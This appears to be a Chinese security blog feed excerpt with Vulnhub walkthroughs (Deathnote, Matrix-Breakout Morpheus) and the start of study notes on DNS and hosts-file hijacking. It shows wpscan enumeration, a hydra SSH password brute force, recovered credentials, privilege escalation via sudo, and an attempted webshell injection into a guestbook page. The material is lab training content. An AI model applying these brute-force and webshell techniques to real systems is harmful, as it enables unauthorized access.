<p><code>22</code>端口开放，运行<code>ssh</code><br><code>80</code>端口开放，运行<code>http</code></p>
</blockquote>
<p>然后访问靶机<code>ip</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221108192408036.png" alt="image-20221108192408036"></p>
<p>看到页面显示<code>please wait.....</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221108192756267.png" alt="image-20221108192756267"></p>
<p>然后显示连接失败</p>
<p>看来是需要修改<code>/etc/hosts</code>文件，添加靶机域名和<code>ip</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221108193016082.png" alt="image-20221108193016082"></p>
<p>再次访问靶机<code>ip</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221108193044669.png" alt="image-20221108193044669"></p>
<p>访问成功</p>
<p>我们先查看一下网站的框架</p>
<p><img src="/2022/08/29/vulnhub/image-20221108200530705.png" alt="image-20221108200530705"></p>
<blockquote>
<p><code>CMS</code>为<code>wordpress 5.8</code>，很老的版本了，这里肯定有提权的方式</p>
<p>采用脚本为<code>Twiiter Emoji</code>，这是推特的开源库里的引用表情的脚本，不是关键</p>
</blockquote>
<p>我们看到页面有<code>hint</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221108193350489.png" alt="image-20221108193350489"></p>
<blockquote>
<p><code>Find a notes.txt file on server or SEE the L comment</code> </p>
<p>意思是：</p>
<p>找到一个notes.txt 文件服务器上<br>或</p>
<p>看看L的评论 </p>
<p>那我们就可以用dirsearch扫一下，看看能不能找到notes.txt文件在哪里，以及评论网页在哪里</p>
</blockquote>
<p>评论页面我是在首页面中间</p>
<blockquote>
<p><code>i will eliminate you L!</code></p>
</blockquote>
<p>链接跳转找到的，但好像没啥信息，似乎看不到<code>L</code>的评论</p>
<p><img src="/2022/08/29/vulnhub/image-20221108204306618.png" alt="image-20221108204306618"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/i</span>ndex.php<span class="regexp">/2021/</span><span class="number">07</span><span class="regexp">/19/</span>kira/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221108204334859.png" alt="image-20221108204334859"></p>
<p>左下角的</p>
<blockquote>
<p><code>my fav line is iamjustic3</code></p>
<p><code>L on i will eliminate you L!</code></p>
<p>我最喜欢的台词是<code>iamjustic3</code><br><code>L</code> 在 ，我会消灭你L! </p>
<p><code>iamjustic3</code>：分开看i am justic 3【我是正义的3】，但好像实际意思，后面看看能不能利用的</p>
<p><code>eliminate</code>：消灭，纯粹单词意思，没啥意义</p>
</blockquote>
<p>我们先用<code>dirsearch</code>扫一下找一下信息</p>
<p><img src="/2022/08/29/vulnhub/image-20221108200416113.png" alt="image-20221108200416113"></p>
<h3 id="关键信息"><a href="#关键信息" class="headerlink" title="*关键信息"></a>*关键信息</h3><p>关键登录页面和<code>robots.txt</code>【其他页面没有啥信息】</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/</span>wp-login.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221108201422820.png" alt="image-20221108201422820"></p>
<p>爬虫文本</p>
<p><img src="/2022/08/29/vulnhub/image-20221108201357084.png" alt="image-20221108201357084"></p>
<blockquote>
<p><code>fuck it my dad</code><br><code>added hint on /important.jpg</code></p>
<p><code>ryuk please delete it</code><br>意思是：<br>x我的爸爸<br>他把暗示藏在了<code>/important.jpg</code>里</p>
<p>ryuk，请删了它</p>
<p>ryuk是基拉的死神，基拉让他删除图片，同时图片也藏有信息<br>虽然我们找到了登录页面，以及用户名，但是还是不知道密码<br>所以还要找密码</p>
</blockquote>
<p>我们先试试我们能不能查看<code>/important.jpg</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221108210813828.png" alt="image-20221108210813828"></p>
<p>发现图片无法显示</p>
<p>看来图片格式有问题，应该是插入了文本什么的</p>
<p>我们用<code>curl</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl http:<span class="regexp">//</span>deathnote.vuln/important.jpg</span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="/2022/08/29/vulnhub/image-20221108220741696.png" alt="image-20221108220741696"></p>
<blockquote>
<p><code>i am Soichiro Yagami, light&#39;s father</code><br><code>i have a doubt if L is true about the assumption that light is kira</code></p>
<p><code>i can only help you by giving something important</code></p>
<p><code>login username : user.txt</code><br><code>i don&#39;t know the password.</code><br><code>find it by yourself</code><br><code>but i think it is in the hint section of site</code></p>
<p>意思是：<br>我是光的父亲 八神宗一郎<br>我怀疑 L 关于光是 kira 的假设是否正确</p>
<p>我只能通过提供一些重要的东西来帮助你</p>
<p>登录用户名：<code>user.txt</code><br>我不知道密码。<br>自己找<br>但我认为它在网站的提示部分<br>#<code>user.txt</code>看来需要同样访问找一下<br>#提示部分有密码，看来就是<code>notes.txt</code>文本里了</p>
</blockquote>
<p>那后面就是找一下这两个文本文件在哪里了</p>
<h2 id="1-wpscan"><a href="#1-wpscan" class="headerlink" title="1.wpscan"></a>1.wpscan</h2><p>既然信息不够，那我们就用对应的<code>CMS</code>工具【<code>wpscan</code>】扫一下看看有没有信息</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wpscan --url http:<span class="regexp">//</span>deathnote.vuln/wordpress -e u</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221108204728050.png" alt="image-20221108204728050"></p>
<p>发现<code>kira</code>才是真正的后台用户，那么<code>ryuk</code>可能就是<code>ssh</code>的登录用户，那他的密码是多少呢</p>
<p>这个时候我想起他的留言</p>
<blockquote>
<p>my fav line is <code>iamjustic3</code></p>
<p>L on i will eliminate you L!</p>
</blockquote>
<p>他说他最喜欢的台词是<code>iamjustic3</code></p>
<p>既然是最喜欢的，那最有可能拿来当密码。所以这个可能就是<code>kira</code>的后台网站的登陆密码</p>
<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><blockquote>
<p><code>kira</code><br><code>iamjustic3</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221108205228054.png" alt="image-20221108205228054"></p>
<p>登录成功</p>
<p>这个页面提醒需要管理员邮箱验证，直接<code>remind me later</code>，我们先到后台看看</p>
<p>进来后台发现<code>comments</code>页面，先看看能不能看到<code>L</code>的评论</p>
<p><img src="/2022/08/29/vulnhub/image-20221108205526638.png" alt="image-20221108205526638"></p>
<p>发现同样啥也没有</p>
<h2 id="2-ssh登录-1"><a href="#2-ssh登录-1" class="headerlink" title="2.ssh登录"></a>2.ssh登录</h2><p>我们再看看其他页面</p>
<p>在<code>Media</code>页面</p>
<p><img src="/2022/08/29/vulnhub/image-20221108211543340.png" alt="image-20221108211543340"></p>
<p>我们发现了<code>notes.txt</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221108211618643.png" alt="image-20221108211618643"></p>
<p>点开得到<code>notes.txt</code>文本的位置</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/</span>wp-content<span class="regexp">/uploads/</span><span class="number">2021</span><span class="regexp">/07/</span>notes.txt</span><br></pre></td></tr></table></figure>

<p>访问得到</p>
<p><img src="/2022/08/29/vulnhub/image-20221108211705028.png" alt="image-20221108211705028"></p>
<p>看起来很像密码本</p>
<blockquote>
<p><code>death4</code><br><code>death4life</code><br><code>death4u</code><br><code>death4ever</code><br><code>death4all</code><br><code>death420</code><br><code>death45</code><br><code>death4love</code><br><code>death49</code><br><code>death48</code><br><code>death456</code><br><code>death4014</code><br><code>1death4u</code><br><code>yaydeath44</code><br><code>thedeath4u2</code><br><code>thedeath4u</code><br><code>stickdeath420</code><br><code>reddeath44</code><br><code>megadeath44</code><br><code>megadeath4</code><br><code>killdeath405</code><br><code>hot2death4sho</code><br><code>death4south</code><br><code>death4now</code><br><code>death4l0ve</code><br><code>death4free</code><br><code>death4elmo</code><br><code>death4blood</code><br><code>death499Eyes301</code><br><code>death498</code><br><code>death4859</code><br><code>death47</code><br><code>death4545</code><br><code>death445</code><br><code>death444</code><br><code>death4387n</code><br><code>death4332387</code><br><code>death42521439</code><br><code>death42</code><br><code>death4138</code><br><code>death411</code><br><code>death405</code><br><code>death4me</code></p>
</blockquote>
<p>我们试试爆破<code>ssh</code></p>
<p>我们再弄个用户名本</p>
<blockquote>
<p>就拿我们已知的三个用户，做成用户名本<br><code>kira</code><br><code>l</code><br><code>ryku</code></p>
</blockquote>
<p>然后九头蛇爆破登录<code>ssh</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L un.txt -P pass.txt <span class="number">192.168.163.123</span> ssh -s <span class="number">22</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221108213915226.png" alt="image-20221108213915226"></p>
<p>发现登录用户【看来用不上去找那个<code>user.txt</code>】</p>
<blockquote>
<p><code>l</code><br><code>death4me</code></p>
</blockquote>
<p>然后我们试试登录</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> l@<span class="number">192.168.16.123</span> </span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221108214049547.png" alt="image-20221108214049547"></p>
<p>登录成功，并看到当前目录下有个文本文件<code>user.txt</code>【无奈，现在找到应该也没啥用了】</p>
<p>查看一下</p>
<p><img src="/2022/08/29/vulnhub/image-20221108214257074.png" alt="image-20221108214257074"></p>
<p>发现是串看不懂的文本</p>
<p>我们试试<code>ciphey</code>解密一下</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">ciphey</span> <span class="literal">-</span><span class="comment">t &quot;</span><span class="literal">++++++++++</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+++</span>&gt;<span class="literal">+++++++</span>&gt;<span class="literal">++++++++++</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;<span class="literal">+++++</span><span class="string">.</span>&lt;&lt;<span class="literal">++</span><span class="string">.</span>&gt;&gt;<span class="literal">+++++++++++</span><span class="string">.</span><span class="literal">------------</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">+++++</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++++++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">--------------</span><span class="string">.</span><span class="literal">++++++++</span><span class="string">.</span><span class="literal">+++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="string">.</span><span class="literal">------------</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++++++++++++++</span><span class="string">.</span><span class="literal">-----------</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span><span class="literal">+++++++</span><span class="string">.</span><span class="string">.</span>&lt;&lt;<span class="string">.</span><span class="literal">++++++++++++</span><span class="string">.</span><span class="literal">------------</span><span class="string">.</span>&gt;&gt;<span class="literal">----------</span><span class="string">.</span><span class="literal">+++++++++++++++++++</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+++++</span><span class="string">.</span><span class="literal">----------</span><span class="string">.</span><span class="literal">++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span><span class="literal">++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">------------------</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">----</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">++++++++++</span><span class="string">.</span><span class="literal">-------</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+++++++++++++++</span><span class="string">.</span><span class="literal">-----</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">----</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span>&lt;&lt;<span class="string">.</span><span class="literal">+++++++++++++</span><span class="string">.</span>&gt;&gt;<span class="literal">++++++</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span><span class="literal">+++++++++</span><span class="string">.</span><span class="literal">-----------------</span><span class="string">.</span></span><br><span class="line"><span class="comment">&quot;</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="/2022/08/29/vulnhub/image-20221108221734407.png" alt="image-20221108221734407"></p>
<blockquote>
<p><code>i think u got the shell , but you wont be able to kill me -kira</code><br>意思是：<br>我想你已经拿到shell了，但你杀不了我-基拉</p>
</blockquote>
<p>感觉信息没啥用，但是大概猜测，杀死基拉是需要提权的，但是从L这里是无法提权，只有基拉才可以提权</p>
<p>我们可以试试我们能否以管理员身份执行一些命令</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221108222201419.png" alt="image-20221108222201419"></p>
<p> 这样看来<code>L</code>是无法以管理员身份执行任何命令，那就只有看看有没有其他路径了</p>
<p>我们再输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>

<p>看看我们当前路径</p>
<p><img src="/2022/08/29/vulnhub/image-20221108214344792.png" alt="image-20221108214344792"></p>
<p>发现我们还有个上级目录，返回查看其下目录</p>
<p>居然还有个<code>kira</code>的目录</p>
<p>我们看看有什么</p>
<p><img src="/2022/08/29/vulnhub/image-20221108214506480.png" alt="image-20221108214506480"></p>
<p><img src="/2022/08/29/vulnhub/image-20221108214544456.png" alt="image-20221108214544456"></p>
<p>发现其目录下的<code>kira.txt</code>设置了权限</p>
<p>我们尝试用之前后台登录的密码登录，也失败了</p>
<h2 id="3-登录kira"><a href="#3-登录kira" class="headerlink" title="3.登录kira"></a>3.登录kira</h2><p>看来我们还需要找找信息，根据<code>user.txt</code>文本信息，我们必须要成功登录<code>kira</code>的用户，才可以提权拿到我们想要的东西</p>
<p>那我们直接搜索当前全部含有kira的文件或者目录</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;kira*&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221108222721847.png" alt="image-20221108222721847"></p>
<p>前两个前面访问过没权限</p>
<p>后面四个三个图片，最后一个也访问过，也没权限</p>
<p><img src="/2022/08/29/vulnhub/image-20221108222833431.png" alt="image-20221108222833431"></p>
<p>那就只有一个了</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>L/kira-<span class="keyword">case</span></span><br></pre></td></tr></table></figure>

<p>我们查看一下有无信息</p>
<p><img src="/2022/08/29/vulnhub/image-20221108223018151.png" alt="image-20221108223018151"></p>
<p>发现其为一个目录，且其下有一个文本文件</p>
<blockquote>
<p><code>the FBI agent died on December 27, 2006</code></p>
<p><code>1 week after the investigation of the task-force member/head.</code><br><code>aka.....</code><br><code>Soichiro Yagami&#39;s family .</code></p>
<p><code>hmmmmmmmmm......</code><br><code>and according to watari ,</code><br><code>he died as other died after Kira targeted them .</code></p>
<p><code>and we also found something in</code><br><code>fake-notebook-rule folder .</code><br>意思是：</p>
<p>联邦调查局特工于 2006 年 12 月 27 日去世</p>
<p>工作组成员&#x2F;负责人调查后 1 周。<br>又名……<br>八神宗一郎的家人。</p>
<p>嗯嗯嗯嗯……<br>根据 Watari 的说法，<br>在基拉瞄准他们之后，他死了，其他人也死了。</p>
<p>我们还发现了一些东西<br>假笔记本规则文件夹</p>
</blockquote>
<p>看来我们需要到<code>fake-notebook-rule</code>这个文件夹下寻找一番</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;fake-notebook-rule&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>找找位置</p>
<p><img src="/2022/08/29/vulnhub/image-20221108223338919.png" alt="image-20221108223338919"></p>
<p>发现在</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>L/fake-notebook-rule</span><br></pre></td></tr></table></figure>

<p>查看其下文件信息</p>
<p><img src="/2022/08/29/vulnhub/image-20221108223431583.png" alt="image-20221108223431583"></p>
<p>大概意思看来就是让我们用<code>cyberchef</code>对<code>case.wav</code>的字符串解密【一眼<code>16</code>进制，直接手动解码算了】</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">63</span> <span class="number">47</span> <span class="number">46</span> <span class="number">7</span>a <span class="number">63</span> <span class="number">33</span> <span class="number">64</span> <span class="number">6</span>b <span class="number">49</span> <span class="number">44</span> <span class="number">6</span>f <span class="number">67</span> <span class="number">61</span> <span class="number">32</span> <span class="number">6</span>c <span class="number">79</span> <span class="number">59</span> <span class="number">57</span> <span class="number">6</span>c <span class="number">7</span>a <span class="number">5</span>a <span class="number">58</span> <span class="number">5</span>a <span class="number">70</span> <span class="number">62</span> <span class="number">43</span> <span class="number">41</span> <span class="number">3</span>d</span><br></pre></td></tr></table></figure>

<p>我们解码试试</p>
<p>解<code>16</code>进制</p>
<p><img src="/2022/08/29/vulnhub/image-20221108223720859.png" alt="image-20221108223720859"></p>
<p>解码<code>base64</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221108223847293.png" alt="image-20221108223847293"></p>
<blockquote>
<p>passwd : <code>kiraisevil</code> </p>
</blockquote>
<p>得到<code>kira</code>密码</p>
<p>我们直接登录</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">su kira</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221108223953100.png" alt="image-20221108223953100"></p>
<p> 登录成功</p>
<h2 id="4-提权-1"><a href="#4-提权-1" class="headerlink" title="4.提权"></a>4.提权</h2><p>我们先看看<code>kira</code>能以管理员身份执行哪些命令</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221108224111044.png" alt="image-20221108224111044"></p>
<p>好家伙</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">ALL</span> : <span class="type">ALL</span>) <span class="keyword">ALL</span></span><br></pre></td></tr></table></figure>

<p>代表他可以以管理员身份执行一切命令，那他就相当于管理员了</p>
<p>执行</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo su</span> </span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221108224357240.png" alt="image-20221108224357240"></p>
<p>直接无密码进入管理员用户</p>
<p>然后查看到根目录查看<code>flag</code></p>
<p><img src="/2022/08/29/vulnhub/image-20221108224501582.png" alt="image-20221108224501582"></p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: </span><br><span class="line">    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: </span><br><span class="line">   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         </span><br><span class="line">  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   </span><br><span class="line"> +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    </span><br><span class="line">#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     </span><br><span class="line">########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       </span><br><span class="line"></span><br><span class="line">##########follow me on twitter###########<span class="number">3</span></span><br><span class="line">and share this screen shot and tag @KDSAMF</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>游戏结束</strong></p>
<hr>
<h2 id="p-s-靶机彩蛋"><a href="#p-s-靶机彩蛋" class="headerlink" title="p.s.靶机彩蛋"></a>p.s.靶机彩蛋</h2><p>之前我们以<code>L</code>的身份查看<code>kira</code>，发现他底下有个<code>kira.txt</code>文本文件，我们无权访问</p>
<p>现在我们可以访问看看</p>
<p><img src="/2022/08/29/vulnhub/image-20221108224728118.png" alt="image-20221108224728118"></p>
<p>发现是一串<code>base64</code>加码字符</p>
<p>解码看看</p>
<p><img src="/2022/08/29/vulnhub/image-20221108224803164.png" alt="image-20221108224803164"></p>
<blockquote>
<p><code>please protect one of the following</code> </p>
<ol>
<li><p><code>L (/opt)</code></p>
</li>
<li><p><code>Misa (/var)</code></p>
</li>
</ol>
<p>  只能选其一来保护</p>
</blockquote>
<p><code>/opt</code>底下的<code>L</code>，我们已经看过了</p>
<p>我们看看<code>/var</code>下的<code>Misa</code>有什么</p>
<p><img src="/2022/08/29/vulnhub/image-20221108225235107.png" alt="image-20221108225235107"></p>
<blockquote>
<p><code>it is toooo late for misa</code><br>#对米沙而言，已经太迟了</p>
</blockquote>
<p>感兴趣的朋友可以去看看<code>DEATH NOTE</code></p>
<hr>
<h1 id="二、MATRIX-BREAKOUT：2-MORPHEUS-中级"><a href="#二、MATRIX-BREAKOUT：2-MORPHEUS-中级" class="headerlink" title="二、MATRIX-BREAKOUT：2 MORPHEUS[中级]"></a>二、MATRIX-BREAKOUT：2 MORPHEUS[中级]</h1><p><strong>《矩阵突破》:2 墨菲斯</strong></p>
<blockquote>
<p>描述：<br><code>This is the second in the Matrix-Breakout series, subtitled Morpheus:1. It’s themed as a throwback to the first Matrix movie. You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out from, which holds the key to a mystery.</code><br><code>Difficulty: Medium-Hard</code></p>
<p>这是 Matrix-Breakout 系列中的第二部，副标题为 Morpheus:1。它的主题是回归第一部 Matrix 电影。您扮演 Trinity，试图调查 Nebuchadnezzar 上的一台计算机，Cypher 已将其他人拒之门外，而这台计算机掌握着解开谜团的钥匙。<br>难度：中等难度</p>
</blockquote>
<p><img src="https://i0.wp.com/xnfood.com.tw/wp-content/uploads/20211012094553_22.jpeg" alt="懶人包》『駭客任務』系列電影回顧，1 ~ 4 集詳細劇情、心得 ..."></p>
<blockquote>
<p>wc确实有东西<br>实在不懂可以看这个研讨会视频<br><code>https://www.beyondtrust.com/webinars/attacking-and-defending-linux-breaking-out-of-the-matrix-edition#video-container</code><br>虽然这个不是这个靶机的wp，但是我还是从其中获得很多思路</p>
</blockquote>
<h2 id="信息收集-10"><a href="#信息收集-10" class="headerlink" title="信息收集"></a>信息收集</h2><p>先扫描一下端口</p>
<p><img src="/2022/08/29/vulnhub/image-20221117130716527.png" alt="image-20221117130716527"></p>
<blockquote>
<p>发现<code>22</code>端口开放，运行着<code>ssh</code><br><code>80，81</code>两个端口都运行着<code>http</code><br>但是两者名字不同，可以判断出<br>但是80端口可以任意访问，<code>81</code>端口访问需要一定权限</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20221117134302741.png" alt="image-20221117134302741"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">发现81端口是需要登录的</span><br></pre></td></tr></table></figure>

<p>然后<code>dirsearch</code>扫一下目录</p>
<p><img src="/2022/08/29/vulnhub/image-20221117130822881.png" alt="image-20221117130822881"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">发现网站目录下有爬虫协议，我们可以访问看看其中有没有关键信息</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221117131146601.png" alt="image-20221117131146601"></p>
<blockquote>
<p><code>There&#39;s no white rabbit here.  Keep searching!</code><br>意思是：这里没有白兔。继续搜索！ </p>
<p>#<code>white rabbit</code>就是爱丽丝梦游仙境里的，跟着白色的兔子，掉进兔子洞</p>
<p>看来是有个引导的信息，会带我们找到一个很关键的东西</p>
</blockquote>
<p>再用<code>whatweb</code>查看网站可显示的框架</p>
<p><img src="/2022/08/29/vulnhub/image-20221117131950416.png" alt="image-20221117131950416"></p>
<p>没有啥信息</p>
<p>我们访问网站看看有没有其他信息</p>
<p><img src="/2022/08/29/vulnhub/image-20221117131405964.png" alt="image-20221117131405964"></p>
<blockquote>
<p><code>Welcome to the Boot2Root CTF, Morpheus:1.</code></p>
<p><code>You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.</code></p>
<p><code>Good luck! - @jaybeale from @inguardians</code><br>意思是：<br>欢迎来到Boot2Root CTF，墨菲斯:1.</p>
<p>你扮演<code>Trinity</code>，试图调查尼布甲尼撒半岛上的一台电脑，<code>Cypher</code>把所有人都锁在外面，至少对于<code>ssh</code>。</p>
<p>祝你好运！ -@jaybealefrom@inguardians </p>
<p>#Cypher电影中反抗组织的一个叛徒，他把反抗组织锁在门外，我们又要用到ssh<br>那看来ssh登录的用户名为Cypher</p>
</blockquote>
<p>信息还是太少了，<code>dirsearch</code>只扫到两个可以访问，实在利用太少</p>
<p>所以我们换个扫描工具</p>
<h3 id="dirbuster"><a href="#dirbuster" class="headerlink" title="dirbuster"></a>dirbuster</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">DirBuster支持全部的Web目录扫描方式，用来探测web服务器上的目录和隐藏文件</span><br></pre></td></tr></table></figure>

<p>这里我利用的是</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/dirbuster/</span>wordlists/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221119232447671.png" alt="image-20221119232447671"></p>
<p>我通过<code>dirbuster</code>工具扫描到</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>/graffiti.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221119232601421.png" alt="image-20221119232601421"></p>
<p>访问</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>/graffiti.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20221119234606473.png" alt="image-20221119234606473"></p>
<p>发现是个留言信息的一个网站</p>
<p>而且我们评论的信息被包含在了<code>graffiti.php</code>文件中</p>
<p>所以我的开始思路是包含一句话🐎</p>
<p>但是插入常规的<code>php</code>🐎，会被破坏</p>
<p><img src="/2022/08/29/vulnhub/image-20221119234929786.png" alt="image-20221119234929786"></p>
<p>故我们插入<code>jsp</code>一句话🐎试试</p>
<p><img src="/2022/08/29/vulnhub/image-20221119235019960.png" alt="image-20221119235019960"></p>
<p>发现插入成功，但是不知道能不能连上</p>
<p>用蚁剑试试</p>
<p>但其实是连不上的，</p>
<p>后面我又试了试<code>xss</code>，虽然有弹窗但是没啥用，也是不行</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title>小迪web视频学习记录</title>
    <url>/2022/07/21/xiaodi/</url>
    <content><![CDATA[<p><u><code>看看小迪师傅的视频，把一些知识点补充以及深入学习一下，做做笔记</code></u></p>
<p><code>时间不是按小迪师傅视频来的，是看我当天的时间，尽量每天能看个一两个吧</code></p>
<span id="more"></span>

<h2 id="DAY1-基础入门-概念名词"><a href="#DAY1-基础入门-概念名词" class="headerlink" title="DAY1 基础入门-概念名词"></a>DAY1 基础入门-概念名词</h2><p><img src="/2022/07/21/xiaodi/image-20220725210618077.png" alt="image-20220725210618077"></p>
<p><strong>1.DNS</strong>：一般指域名系统，可以将IP和域名相互转化，比如访问baidu.com，DNS就会查出它的IP例如120.0.0.1，进行访问，从而人们不用输入复杂的IP</p>
<p>我们有时<u>打开一些网站或者下载东西时卡顿</u>，我们百度往往会得到一个方法修改<strong>hosts</strong>文件</p>
<p><strong>hosts</strong>文件负责解析域名并优先于DNS服务，通常很多恶意软件会恶意更改该文件来达到劫持网站的目地，也就是DNS攻击</p>
<p>比如下图，当在<strong>hosts</strong>文件里加上时，当我们在浏览器访问<code>www.baidu.com</code>的时候就会访问<strong>IP:14.215.177.38</strong>，而这个<strong>IP</strong>可能是百度的网站，也可能是钓鱼网站的IP，这个时候我们光看浏览器网站域名就根本分不清楚（如果钓鱼网站页面和我们的目标网站界面一致）</p>
<p><img src="/2022/07/21/xiaodi/image-20220721145608355.png" alt="image-20220721145608355"></p>
<hr>
